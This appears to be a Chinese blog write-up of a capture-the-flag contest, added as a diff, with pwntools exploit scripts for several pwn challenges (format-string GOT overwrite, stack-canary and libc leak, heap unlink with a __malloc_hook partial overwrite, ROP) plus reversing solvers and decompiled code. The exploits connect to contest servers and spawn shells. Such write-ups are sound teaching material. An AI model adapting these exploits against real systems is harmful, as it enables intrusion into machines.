@@ -1,0 +1,615 @@
+简单的写一下，还有其他比赛，详细的到时候会发在博客
+
+## notebook
+
+这题估计非预期魔咒又发作了，里面那一堆代码根本没用上，直接`snprintf`写`printf`的GOT表，前面放个`/bin/sh`然后后面`printf`直接就getshell了。注意不能用`%x`，因为`/bin/sh`不能带参数，只能后面加很多空格，所以要找个空字符串。
+
+```python
+from pwn import *
+
+g_local=False
+context.log_level='debug'
+if g_local:
+	sh =process('./notebook')#env={'LD_PRELOAD':'./libc.so.6'}
+	gdb.attach(sh)
+else:
+	sh = remote("118.31.49.175", 9999)
+
+sh.recvuntil("May I have your name?\n")
+
+payload = "/bin/sh" + "%29$34233s%30$hn" + "%31$n\x00\x00\x00\x00" + p32(0x804A094) + p32(0x804A010) + p32(0x804A08C)
+
+sh.send(payload + "\n")
+sh.interactive()
+```
+
+## babycpp
+
+`get_array`里面有溢出，先增加num再`do_unique`里面可以Leak出canary和libc（main的返回值在libc），最后`one_gadget`，清空一下栈让他条件满足
+
+```python
+from pwn import *
+
+g_local=True
+context.log_level='debug'
+START_MAIN_OFF = 0x20830
+if g_local:
+	sh = process('./babycpp')#env={'LD_PRELOAD':'./libc.so.6'}
+	#gdb.attach(sh)
+else:
+	sh = remote("118.31.49.175", 9999)
+
+def init_n(n):
+	sh.recvuntil("input n:\n")
+	sh.send(str(n) + "\n")
+	sh.recvuntil("> ")
+
+def get_array(arr):
+	sh.send("2\n")
+	sh.recvuntil("input ")
+	sh.recvuntil(" num:\n")
+	for x in arr:
+		sh.send(str(x) + "\n")
+	sh.recvuntil("> ")
+
+def change_num(num):
+	sh.send("1\n")
+	sh.send(str(num) + "\n")
+	sh.recvuntil("> ")
+
+def unique():
+	sh.send("3\n")
+	arr = sh.recvuntil("\n")
+	sh.recvuntil("> ")
+	split = arr.split(" ")
+	return map(int,split[:len(split)-1])
+
+init_n(8)
+
+#------------leak cookie---------------
+get_array([2019]*8)
+change_num(28)
+arr = unique()
+
+cookie = (arr[11] & 0xffffffff) + ((arr[12] & 0xffffffff) << 32)
+libc_addr = ((arr[15] & 0xffffffff) + ((arr[16] & 0xffffffff) << 32)) - START_MAIN_OFF
+print hex(cookie)
+print hex(libc_addr)
+one_gadget = libc_addr + 0x4526a
+change_num(100)
+payload = range(0,22) + [arr[11], arr[12]] + [0, 0] + [(one_gadget & 0xffffffff), (one_gadget >> 32)]
+payload += [0] * (100-len(payload))
+get_array(payload)
+sh.interactive()
+```
+
+## NoLeak
+
+这题估计非预期魔咒又发作，我的解法成功率只有`1/16`。人品好跑个两三次就能getshell，不好差不多跑个20多次也能成功。
+
+漏洞点一个UAF，一个往后溢出。
+
+首先`.bss`可写可执行，所以Unlink先拿到任意写，然后写shellcode，这是第一步。
+
+第二步因为不能leak，所以要想好办法劫持`rip`，我最后决定是写`__malloc_hook`，因为这个全局变量就在`unsorted bin`前面一点点，所以可以用0day安全一书中的覆盖小端部分字节来绕过ASLR的思路，但是只写一个字节成功不了，因为没那么近，又不可能写3个nibble（4位），所以只能写2个字节，第四个`nibble`随便设，所以说成功率`1/16`。
+
+```python
+from pwn import *
+
+g_local=True
+context.log_level='debug'
+START_MAIN_OFF = 0x20830
+BUF_ADDR = 0x601040
+SHELL_CODE_ADDR = 0x601800
+if g_local:
+	sh = process('./NoLeak')#env={'LD_PRELOAD':'./libc.so.6'}
+	gdb.attach(sh)
+else:
+	sh = remote("118.31.49.175", 9999)
+
+def create(size, data = "A"):
+	sh.send("1\x00")
+	sh.recvuntil("Size: ")
+	sh.send(str(size) + "\x00")
+	sh.recvuntil("Data: ")
+	sh.send(data)
+	sh.recvuntil("Your choice :")
+
+def delete(idx):
+	sh.send("2\x00")
+	sh.recvuntil("Index: ")
+	sh.send(str(idx) + "\x00")
+	sh.recvuntil("Your choice :")
+
+def update(idx, size, data):
+	sh.send("3\x00")
+	sh.recvuntil("Index: ")
+	sh.send(str(idx) + "\x00")
+	sh.recvuntil("Size: ")
+	sh.send(str(size) + "\x00")
+	sh.recvuntil("Data: ")
+	sh.send(data)
+	sh.recvuntil("Your choice :")
+
+
+sh.recvuntil("Your choice :")
+
+# unlink to write shellcode------------------------------
+create(0x100) #0
+create(0x110) #1
+delete(0)
+delete(1)
+unlink_payload = p64(0)+p64(0x101)
+unlink_payload += p64(BUF_ADDR-0x18)+p64(BUF_ADDR-0x10)
+unlink_payload += 'A'*(0x100-0x20)
+unlink_payload += p64(0x100) + p64(0x220-0x100)
+create(0x220, unlink_payload) #2
+delete(1)
+#buf[0] = 0x601028 = &buf - 0x18
+update(0, 0x20, "\x00" * 0x18 + p64(SHELL_CODE_ADDR))
+update(0, 0x100 ,asm(shellcraft.amd64.linux.sh(), arch = 'amd64', os = 'linux'))
+# Top Chunk: 0xaeb010
+# Last Remainder: 0
+
+# 0xaeb000 PREV_INUSE {
+#   prev_size = 0,
+#   size = 561,
+#   fd = 0x0,
+#   bk = 0x20ff1,
+#   fd_nextsize = 0x601028,
+#   bk_nextsize = 0x601030
+# }
+
+create(0x68) #3
+create(0xf0) #4
+create(0x68, "A" * 0x60 + p64(0x170)) #5
+
+delete(5)
+delete(4)
+update(3, 0x70 ,"A" * 0x68 + p64(0x171))
+
+create(0xf0) #6
+update(5, 2, p16(0x8b10-3-0x20)) # 0x?b10，成功率1/16
+
+create(0x60)
+create(0x60, "\x00" * 0x13 + p64(SHELL_CODE_ADDR))
+sh.send("1\x00")
+sh.recvuntil("Size: ")
+sh.send("1\x00")
+sh.interactive()
+```
+
+## Dice Game
+
+溢出把种子设为0，然后随机数就可以预测了（PS：其实这题没溢出也能做，因为`time(0)`是可预测的。。。）
+
+```python
+from pwn import *
+
+g_local=False
+context.log_level='debug'
+
+if g_local:
+	sh = process('./dice_game')#env={'LD_PRELOAD':'./libc.so.6'}
+	#gdb.attach(sh)
+else:
+	sh = remote("47.96.239.28", 9999)
+
+ans = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1] #写个简单的C语言程序可以获取到这个
+
+sh.recvuntil(" let me know your name: ")
+sh.send("A" * 0x40 + p64(0))
+
+for x in ans:
+	sh.recvuntil("Give me the point(1~6): ")
+	sh.send(str(x) + "\n")
+
+sh.interactive()
+```
+
+## stack2
+
+数组越界栈任意写，所以可以跳过cookie直接构造ROP，`/bin/bash`那个是坑。。。但是幸运的是`sh`就在那个字符串里面，能直接执行。。。
+
+```python
+from pwn import *
+
+g_local=True
+context.log_level='debug'
+
+if g_local:
+	sh = process('./stack2')#env={'LD_PRELOAD':'./libc.so.6'}
+	gdb.attach(sh)
+else:
+	sh = remote("47.96.239.28", 2333)
+
+def write_byte(off, val):
+	sh.send("3\n")
+	sh.recvuntil("which number to change:\n")
+	sh.send(str(off) + "\n")
+	sh.recvuntil("new number:\n")
+	sh.send(str(val) + "\n")
+	sh.recvuntil("5. exit\n")
+
+def write_dword(off, val):
+	write_byte(off, val & 0xff)
+	write_byte(off + 1, (val >> 8) & 0xff)
+	write_byte(off + 2, (val >> 16) & 0xff)
+	write_byte(off + 3, (val >> 24) & 0xff)
+
+def exit():
+	sh.send("5\n")
+	sh.interactive()
+
+sh.recvuntil("How many numbers you have:\n")
+sh.send("1\n")
+sh.recvuntil("Give me your numbers\n")
+sh.send("1\n")
+sh.recvuntil("5. exit\n")
+
+write_dword(0x84, 0x8048450)
+write_dword(0x8C, 0x8048980 + 7)
+exit()
+```
+
+## babyre
+
+一个rust写的程序，通过特征字符串Google获得，之前也没有学过rust，也是第一次做rust逆向。
+
+动态调试看read调用时的栈帧，发现关键校验函数在`critical_A110`，其中有3个check。
+
+```c
+  if ( rust_strlen(&a1) == 32 )
+  {
+    sub_D500(&a1, v4);
+    sub_D250((unsigned __int64)&v25);
+    sub_10D10((rust_str *)&v25);
+    sub_D250((unsigned __int64)&v23);
+    v37 = 1;
+    sub_D030(&v25);
+    v37 = 0;
+    *(_QWORD *)v28 = *(_QWORD *)v24;
+    *(_OWORD *)v27 = *(_OWORD *)&v23;
+    fst_trans((__int64)(&v25.private_2 + 1), (struct _Unwind_Exception *)v27);
+    a2.length = *(_QWORD *)v26;
+    *(_OWORD *)&a2.p_str = *(_OWORD *)(&v25.private_2 + 1);
+    snd_trans(&v29, &a2);
+    *(_QWORD *)v34 = v29.length;
+    *(_OWORD *)v33 = *(_OWORD *)&v29.p_str;
+    trd_trans((__int64)v31, (struct _Unwind_Exception *)v33);
+    v36 = v32;
+    *(_OWORD *)v35 = *(_OWORD *)v31;
+    sub_9F50((struct _Unwind_Exception *)v35);
+    v37 = 0;
+  }
+```
+
+其中rust字符串结构体为
+
+```assembly
+00000000 rust_str        struc
+00000000 p_str           dq ?
+00000008 length_not_sure dq ?
+00000010 length          dq ?
+00000018 rust_str        ends
+```
+
+大概是这样，不保证完全对。
+
+然后第一个trans是打乱位置，第二个是做一些加减法，第三个是做左移右移。
+
+```python
+def reverse_snd(src):
+	res = [0] * 0x20
+	for i in xrange(0,8):
+		x = i * 4
+		res[(x + 3) % 0x20] = (src[(x + 3) % 0x20] + 0x7f) % 0x100
+		res[(x + 4) % 0x20] = (src[(x + 4) % 0x20] - 7) % 0x100
+		res[(x + 5) % 0x20] = (src[(x + 5) % 0x20] - 18) % 0x100
+		res[(x + 6) % 0x20] = (src[(x + 6) % 0x20] - 88) % 0x100
+	return res
+
+def reverse_trd(src):
+	res = [0] * 0x20
+	for i in xrange(0,8):
+		x = i * 4
+		tmp = src[(x + 9) % 0x20]
+		res[(x + 9) % 0x20] = ((tmp << 2) % 0x100) | (tmp >> 6)
+		tmp = src[(x + 10) % 0x20]
+		res[(x + 10) % 0x20] = ((tmp << 7) % 0x100) | (tmp >> 1)
+		tmp = src[(x + 11) % 0x20]
+		res[(x + 11) % 0x20] = ((tmp << 4) % 0x100) | (tmp >> 4)
+		tmp = src[(x + 12) % 0x20]
+		res[(x + 12) % 0x20] = ((tmp << 5) % 0x100) | (tmp >> 3)
+	return res
+
+def reverse_fst(src):
+	res = [0] *0x20
+	for i in xrange(0,8):
+		x = i * 4
+		res[x] = src[x + 1]
+		res[x + 1] = src[x + 3]
+		res[x + 2] = src[x]
+		res[x + 3] = src[x + 2]
+	return res
+
+
+v1 = [0] * 0x20
+v1[0] = 218;
+v1[1] = 216;
+v1[2] = 61;
+v1[3] = 76;
+v1[4] = 227;
+v1[5] = 99;
+v1[6] = -105;
+v1[7] = 61;
+v1[8] = -63;
+v1[9] = 145;
+v1[10] = -105;
+v1[11] = 14;
+v1[12] = 227;
+v1[13] = 92;
+v1[14] = -115;
+v1[15] = 126;
+v1[16] = 91;
+v1[17] = 145;
+v1[18] = 111;
+v1[19] = -2;
+v1[20] = -37;
+v1[21] = -48;
+v1[22] = 23;
+v1[23] = -2;
+v1[24] = -45;
+v1[25] = 33;
+v1[26] = -103;
+v1[27] = 75;
+v1[28] = 115;
+v1[29] = -48;
+v1[30] = -85;
+v1[31] = -2;
+
+final = map(lambda x: x % 0x100, v1)
+flag = reverse_fst(reverse_snd(reverse_trd(final)))
+print "".join(map(chr,flag))
+```
+
+最后那个函数是关键校验，改eflags可得第一个branch能输出正确信息
+
+```c
+void __fastcall sub_9F50(struct _Unwind_Exception *a1)
+{
+  _BYTE *v1; // rax
+  struct _Unwind_Exception v2; // [rsp+20h] [rbp-98h]
+  char v3; // [rsp+70h] [rbp-48h]
+
+  v1 = (_BYTE *)sub_DF80(32, 1);
+  *v1 = 218;
+  v1[1] = 216;
+  v1[2] = 61;
+  v1[3] = 76;
+  v1[4] = 227;
+  v1[5] = 99;
+  v1[6] = -105;
+  v1[7] = 61;
+  v1[8] = -63;
+  v1[9] = 145;
+  v1[10] = -105;
+  v1[11] = 14;
+  v1[12] = 227;
+  v1[13] = 92;
+  v1[14] = -115;
+  v1[15] = 126;
+  v1[16] = 91;
+  v1[17] = 145;
+  v1[18] = 111;
+  v1[19] = -2;
+  v1[20] = -37;
+  v1[21] = -48;
+  v1[22] = 23;
+  v1[23] = -2;
+  v1[24] = -45;
+  v1[25] = 33;
+  v1[26] = -103;
+  v1[27] = 75;
+  v1[28] = 115;
+  v1[29] = -48;
+  v1[30] = -85;
+  v1[31] = -2;
+  sub_D270((__int64)&v2, (__int64)v1, 32LL);
+  if ( sub_10E90((__int64)a1, (__int64)&v2) & 1 )
+  {
+    sub_CCF0(&v2.private_2 + 1, (__int64)&off_27B2B0, 1LL, (__int64)"wrong\n", 0LL);// correct
+    sub_16AB0(&v2.private_2 + 1);
+  }
+  else
+  {
+    sub_CCF0(&v3, (__int64)&off_27B2C0, 1LL, (__int64)"wrong\n", 0LL);
+    sub_16AB0(&v3);
+  }
+  sub_D030(&v2);
+  sub_D030(a1);
+}
+```
+
+## babymips
+
+每次mips都是手撸汇编的。。。大概就是先异或`0x20-i`，再根据奇偶性做不同的左移右移。。。
+
+```python
+flag = "qctf{"
+keys = [0x52, 0xFD, 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80,
+0x13, 0x41, 0x54, 0xA0, 0x8D, 0x45, 0x18, 0x81,  0xDE, 0xFC, 0x95, 0xF0, 0x16, 0x79, 0x1A, 0x15,
+0x5B, 0x75, 0x1F]
+print len(keys)
+for i in xrange(5,0x20):
+	for c in xrange(0,0x100):
+		fst = (c ^ ((0x20-i)))
+		if (i % 2) == 0:
+			res = ((fst << 2) % 0x100) | (fst >> 6)
+		else:
+			res = (fst >> 2) | ((fst << 6) % 0x100)
+		if (res == keys[i-5]):
+			flag += chr(c)
+
+print flag
+```
+
+## asong
+
+这题好像坑了我最久。。。他有一个把字符转成数字的`0x400936`函数，大概是他会先统计给定歌词每个字符的频率，然后把输入映射到相应字符的频率上，再打乱顺序，做左移右移变换。（打乱顺序的table一开始dump错了，卡了很久，晕。。。）
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  _DWORD *freq_song; // ST00_8
+  char *v4; // ST08_8
+
+  freq_song = malloc(0xBCuLL);                  // 47*4
+  v4 = (char *)malloc(0x50uLL);
+  init_0();
+  read_input(v4);
+  take_mid_part(v4);
+  text_freq_stats("that_girl", freq_song);
+  critical_400E54(v4, freq_song);
+  return 0LL;
+}
+
+unsigned __int64 __fastcall critical_400E54(const char *input, _DWORD *freq_song)
+{
+  int i; // [rsp+18h] [rbp-48h]
+  int a3; // [rsp+1Ch] [rbp-44h]
+  char freq_input[56]; // [rsp+20h] [rbp-40h]
+  unsigned __int64 v6; // [rsp+58h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  a3 = strlen(input);
+  for ( i = 0; i < a3; ++i )
+    freq_input[i] = freq_song[char_to_num_below47(input[i])];
+  transform_freq_input1((unsigned __int8 *)freq_input);
+  transform_freq_input2(freq_input, a3);
+  write_to_file(freq_input, "out", a3);
+  return __readfsqword(0x28u) ^ v6;
+}
+```
+
+话说这题一个堆变量未初始化，一个堆溢出，搞得我以为是pwn。。。
+
+```python
+def rev_bit_oper(src):
+	res = [0] * 0x26
+	# a1[i] = (a1[i] << 3) | (a1[i + 1] >> 5);
+	for i in xrange(0,0x26):
+		res[i] |= (src[i] >> 3)
+		res[(i + 1) % 0x26] |= ((src[i] << 5) % 0x100)
+	return res
+
+out = [0xec, 0x29, 0xe3, 0x41, 0xe1, 0xf7, 0xaa, 0x1d, 0x29, 0xed, 0x29, 0x99, 0x39, 0xf3, 0xb7, 0xa9,
+ 0xe7, 0xac, 0x2b, 0xb7, 0xab, 0x40, 0x9f, 0xa9, 0x31, 0x35, 0x2c, 0x29, 0xef, 0xa8, 0x3d, 0x4b,
+ 0xb0, 0xe9, 0xe1, 0x68, 0x7b, 0x41]
+
+tab = [0x16, 0x0, 0x6, 0x2, 0x1E, 0x18, 0x9,
+0x1, 0x15, 0x7, 0x12, 0x0A, 0x8, 0x0C, 0x11, 0x17,
+0x0D, 0x4, 0x3, 0x0E, 0x13, 0x0B, 0x14, 0x10, 0x0F,
+0x5, 0x19, 0x24, 0x1B, 0x1C, 0x1D, 0x25, 0x1F, 0x20,
+0x21, 0x1A, 0x22, 0x23]
+
+song_freq = [0x00000000, 0x00000000, 0x00000000, 0x00000000,
+0x00000000, 0x00000000, 0x00000000, 0x00000000,
+0x00000000, 0x00000000, 0x00000068, 0x0000001e,
+0x0000000f, 0x0000001d, 0x000000a9, 0x00000013,
+0x00000026, 0x00000043, 0x0000003c, 0x00000000,
+0x00000014, 0x00000027, 0x0000001c, 0x00000076,
+0x000000a5, 0x0000001a, 0x00000000, 0x0000003d,
+0x00000033, 0x00000085, 0x0000002d, 0x00000007,
+0x00000022, 0x00000000, 0x0000003e, 0x00000000,
+0x00000000, 0x00000000, 0x00000000, 0x00000000,
+0x00000000, 0x00000028, 0x00000047, 0x00000000,
+0x00000000, 0x00000042, 0x000000f5]
+
+def get_assign_conversion(tab):
+	ret = range(0, 0x26)
+	x = 0
+	while tab[x] != 0:
+		ret[x] = ret[tab[x]]
+		x = tab[x]
+	ret[x] = 0
+	return ret
+
+def get_assign(tab):
+	ret = []
+	x = 0
+	while tab[x] != 0:
+		print hex(x) + " = " + hex(tab[x])
+		ret.append((tab[x],x))
+		x = tab[x]
+	ret.append((0,x))
+	return ret
+
+def recover_order_2(order2, l):
+	ret = [0] * 0x26
+	for i in xrange(0,0x26):
+		ret[order2[i]] = l[i]
+	return ret
+
+def recover_order(order, l):
+	ret = list(l)
+	rorder = list(order)
+	rorder.reverse()
+	print rorder
+	print len(rorder)
+	for o in rorder:
+		ret[o[0]] = l[o[1]]
+	return ret
+
+def frequecies_to_nums(frequecies, freq_tab):
+	ret = []
+	for f in frequecies:
+		ret.append(freq_tab.index(f))
+	return ret
+
+def num_to_chars(num):
+	if num == 45:
+		return '\n'
+	elif num >= 42 and num <= 44:
+		return chr(num - 10)
+	elif num == 41:
+		return '\''
+	elif num == 40:
+		return ','
+	elif num == 39:
+		return '.'
+	elif num == 37 or num == 38:
+		return chr(num + 21)
+	elif num == 36:
+		return '?'
+	elif num == 46:
+		return '_'
+	elif num >= 0 and num < 10:
+		return chr(num + ord('0'))
+	elif num >= 10 and num <= 35:
+		return chr(num + 87) #55
+	else:
+		assert False
+		return None
+
+
+rev_snd = rev_bit_oper(out)
+print map(hex, rev_snd)
+for x in rev_snd:
+	assert(x in song_freq)
+
+frequecies = recover_order_2(get_assign_conversion(tab), rev_snd)
+
+print "assign: "
+print get_assign(tab)
+print map(hex, frequecies)
+
+nums = frequecies_to_nums(frequecies, song_freq)
+print map(hex, nums)
+
+print "".join(map(num_to_chars, nums))
+```
+
+## Aface
+
+二维码用画图工具把左边的给填充一下，直接复制右上角那个就好，然后base32解码。。。
